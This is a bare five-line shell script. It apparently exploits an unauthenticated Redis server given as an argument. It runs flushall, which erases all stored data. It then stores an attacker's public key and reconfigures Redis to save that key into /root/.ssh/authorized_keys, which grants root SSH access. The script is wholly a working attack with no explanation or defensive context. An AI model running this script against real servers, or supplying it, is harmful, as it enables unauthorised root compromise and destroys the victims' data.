redis-cli  -h $1 flushall
cat pub.txt | redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /root/.ssh
redis-cli -h $1 config set dbfilename authorized_keys
redis-cli -h $1 save